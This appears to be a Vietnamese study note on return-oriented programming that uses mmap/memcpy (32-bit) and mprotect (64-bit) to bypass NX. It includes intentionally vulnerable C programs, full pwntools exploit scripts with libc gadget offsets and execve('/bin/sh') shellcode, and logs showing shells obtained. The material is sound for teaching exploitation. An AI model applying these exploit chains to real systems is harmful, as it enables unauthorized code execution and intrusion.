# ROP - mprotect, mmap

kĩ thuật này dùng để map 1 vị trí trong stack có thể rwx, hỗ trợ cho việc execute shellcode, thường dùng để bypass NX (DEP). mình vẫn không rõ thật sự kĩ thuật này có thể làm gì nếu ta đã có được libc thì tội gì mà làm dài dòng như thế này.

# x86 - mmap

source:
```c
//gcc -m32 -fno-stack-protector -o rop rop.c -ldl -no-pie
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
  
void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 256);
}
 
void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```
trước khi vào nghiên cứu thì chúng ta hãy cài tools rp++ - đây là tools mà mình dùng trong bài viết này để tìm tất cả các unique gadget mà ROPgadget thông thường không tìm được (tìm trong libc). Dùng lệnh bash sau để có thể cài 1 cách tiện lợi
```bash
#!/bin/bash -ex


# 64bit test
if [[ $(uname -m) == 'x86_64' ]];
then
  BIN="rp-lin-x64" 
else
  BIN="rp-lin-x86" 
fi

wget https://github.com/downloads/0vercl0k/rp/$BIN
mv $BIN rp++
mkdir bin
chmod 755 rp++
mv rp++ bin
```

-	mục tiêu của kĩ năng này là:
	-	tạo 1 vùng nhớ có RWX privileges bằng cách dùng hàm mmap()
	-	copy shellcode vào vùng nhớ đó thông qua hàm memcpy()

biểu diễn thông qua C code sau:
```c
mmap(0x20000000,0x1000,0x7,0x22,0xffffffff,0)
memcpy(0x20000000,'address of shellcode',len(shellcode))
```
lưu ý ở đây memcpy() không thể copy giá trị địa chỉ. tức là khi thực hiện hàm memcpy(), thì địa chỉ mà ta đã copy được lưu vào eax.
ví dụ: memcpy(0x1000, 0x2000, 0x100)
tức ta chỉ copy dựa trên địa chỉ chứ không thể copy trực tiếp giá trị được truyền vào
>https://github.com/walac/glibc/blob/master/sysdeps/x86_64/multiarch/memcpy.S

## popad, pushad

|instruction|description|
---|---
popad|lưu các giá trị có trong stack vào tất cả thanh ghi trừ eip <br>theo thứ tự EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI theo thứ tự từ phải sang
pushad| ngược lại popad, push tất cả giá trị trừ eip <br>theo thứ tự EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI|

- cấu trúc ROP:
  - mmap() 1 vùng nhớ mới
  - dùng popad để lưu các giá trị arg trên stack (tức vùng nhớ vừa tạo từ mmap())
  - dùng `xhcg` để lưu giá trị trả về từ memcpy()
  - sau khi gọi hàm memcpy(), bởi `pop esi;ret`, thì ret addr được lưu vào esi.
  - giá trị param đầu tiên được lưu vào ebp bởi `pop ebp;ret`
  - giá trị param thứ ba được lưu vào ebx bởi `pop ebx;ret`
  - sau khi đã setup đầy đủ các register, ta dùng `pushad` để lưu giá trị ở 0x1028 (0x1048 -(0x4\*số lượng reg(8)))
    - bởi vì param thứ 2 lưu ở esp, nên không cần setup gì nữa
  - lúc này ở 0x1028, shellcode được lưu trên stack thông qua hàm memcpy() sẽ được copy vào vùng nhớ tạo bởi mmap()
  - khi kết thúc memcpy(), flow của binary sẽ nhảy vào vùng nhớ được tạo để execute shellcode
    - vì vùng nhớ chúng ta tạo có rwx privilieges, nên shellcode có thể execute

trước khi thực hiện pushad:

stack address | value| explanation
---|---|---
0x1000|mmap()|gọi mmap()
0x1004|popad gadget| fake ebp<br>(tức sau mmap() sẽ đến 0x1024)
0x1008|1st arg|
0x100c|2nd arg|
0x1010|3rd arg|
0x1014|4th arg|
0x1018|5th arg|
0x101c|aaaa|padding
0x1020|aaaa|padding
0x1024|memcpy()|
0x1028|xhcg eax, edi gadget| 
0x102c|pop esi gadget|
0x1030|new mem address|
0x1034|pop ebp gadget|
0x1038|new mem address|
0x103c|pop ebx gadget|
0x1040|shellcode length|
0x1044|pushad gadget| trở về 0x1028
0x1048|shellcode|nơi chứa shellcode

sau khi thực hiện pushad:

stack address | value| explanation
---|---|---
0x1000|mmap()|gọi mmap()
0x1004|popad gadget|
0x1008|1st arg|
0x100c|2nd arg|
0x1010|3rd arg|
0x1014|4th arg|
0x1018|5th arg|
0x101c|aaaa|padding
0x1020|aaaa|padding
0x1024|memcpy()|
0x1028|memcpy()| esp:0x1028 
0x102c|new mem address|
0x1030|new mem address|
0x1034|shellcode address| trỏ về shell<br>trong stack
0x1038|shellcode length|

dông dài thế cũng khá là nhức đầu, nên bây giờ đến source py
```py
from pwn import *
  #context.log_level = 'debug'
 
#32bit OS
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
#64bit OS
#libc = ELF("/lib32/libc-2.23.so")

shellcode = asm(shellcraft.i386.linux.execve('/bin/sh\x00',0,0)) 
binary = ELF('./source')
p = process(binary.path)
 
p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)
 
new_memory = 0x20000000
 
#Libc
libc_base = stackAddr - 0x49680
libc_mmap = libc_base + libc.symbols['mmap']
libc_memcpy = libc_base + libc.symbols['memcpy']
 
#ROP Gadget
#note: lưu ý rằng tất cả các offset này đều tìm = rp++
libc_popad = libc_base + 0x0016b902
libc_xchg_eax_edi = libc_base + 0x0006fd59
libc_pop_esi = libc_base + 0x00017828
libc_pop_ebp = libc_base + 0x000179a7
libc_pop_ebx = libc_base + 0x000189d7
libc_pushad = libc_base + 0x000060bc
 
log.info('Libc base : '+hex(libc_base))
log.info('mmap addr : '+hex(libc_mmap))
log.info('memcpy addr : '+hex(libc_memcpy))
 
payload = "A"*66
 
#mmap(0x20000000,0x1000,0x7,0x22,0xffffffff,0)
payload += p32(libc_mmap)
payload += p32(libc_popad)
payload += p32(new_memory)
payload += p32(0x1000)
payload += p32(0x7)
payload += p32(0x22)
payload += p32(0xffffffff)
payload += p32(0)
payload += 'AAAA' * 2
 
 
#memcpy(new_memory,'address of shellcode',(len(shellcode))
payload += p32(libc_memcpy)
payload += p32(libc_xchg_eax_edi)
payload += p32(libc_pop_esi)
payload += p32(new_memory)
payload += p32(libc_pop_ebp)
payload += p32(new_memory)
payload += p32(libc_pop_ebx)
payload += p32(len(shellcode))
payload += p32(libc_pushad)
payload += shellcode
 
# gdb.attach(p,'b*0x8048591')
p.send(payload)
p.interactive()
```
```bash
$ python script.py 
[*] '/lib/i386-linux-gnu/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/xfeebe/research/rop-mprotect,mmap/source'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/xfeebe/research/rop-mprotect,mmap/source': pid 9219
[*] Libc base : 0xf7dfb000
[*] mmap addr : 0xf7eddda0
[*] memcpy addr : 0xf7e726f0
[*] Switching to interactive mode
$ id
uid=1000(xfeebe) gid=1000(xfeebe) groups=1000(xfeebe),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$  
```

# x64 - mprotect

source:
```c
//gcc -fno-stack-protector -o rop rop.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
   
void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    printf("buf[50] address : %p\n",buf);
    read(0, buf, 256);
}
  
void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```

- cách thức để rop:
  - thay đổi privilieges nơi chứa shellcode thông qua mprotect()
    - mprotect() thay đổi access protection cho memory page của process hiện tại đang được gọi của range địa chỉ [addr, addr + len - 1]
    - giá trị của addr phải align với page boundary
      - size của page là 4096
    - ex
      - không đúng: 0x7ffd0e0a4**470**
      - đúng: 0x7ffd0e0a4**000**

thể hiện thành code c:
```c
mprotect(address of shellcode,0x2000,0x7)
```
### Preparation

- libc
  - mprotect
- gadget
  - pop rdi, ret
  - pop rsi, ret 
  - pop rdx, ret 

tương tự như trên, ta dùng rp++ để tìm gadget trên libc được share với binary


source py:
```py
from pwn import *

  
context.update(arch='amd64',os='linux')

# shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = asm(shellcraft.execve('/bin/sh\x00',0,0))
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libcbase_printf_offset = libc.symbols['printf']
libcbase_mprotect_offset = libc.symbols['mprotect']
 
pop_rdi_ret = 0x004007b3
pop_rdx_rsi_ret_offset = 0x00115189
  
r = process('./rop64')
# libc leak
r.recvn(10)
r.recvuntil('Printf() address : ')
libcbase = int(r.recvuntil('\n'),16)
libcbase -= libcbase_printf_offset
# stack leak
r.recvuntil('buf[50] address : ')
stack = int(r.recvuntil('\n'),16)
back = str(hex(stack))
shellArea = int(back[0:11] + '000',16)
 
log.info(back[0:11])
log.info(hex(shellArea))
log.info("libcbase : " + hex(libcbase))
log.info("stack : " + hex(stack))
log.info("mprotect() : " + hex(libcbase + libcbase_mprotect_offset))
 
payload = shellcode
payload += "A" * (72 - len(shellcode))
 
 
#mprotect(address of shellcode,0x2000,0x7)
payload += p64(pop_rdi_ret)
payload += p64(shellArea)
payload += p64(libcbase + pop_rdx_rsi_ret_offset)
payload += p64(0x7)
payload += p64(0x2000)
payload += p64(libcbase + libcbase_mprotect_offset)
payload += p64(stack)
 
gdb.attach(r,'b*0x400726')
r.send(payload)
r.interactive()
```
```bash
$ python mprotect.py 
[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './rop64': pid 11299
[*] 0x7fffffffd
[*] 0x7fffffffd000
[*] libcbase : 0x7ffff7809000
[*] stack : 0x7fffffffdd50
[*] mprotect() : 0x7ffff790a830
[*] Switching to interactive mode
$ id
uid=1000(xfeebe) gid=1000(xfeebe) groups=1000(xfeebe),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$
```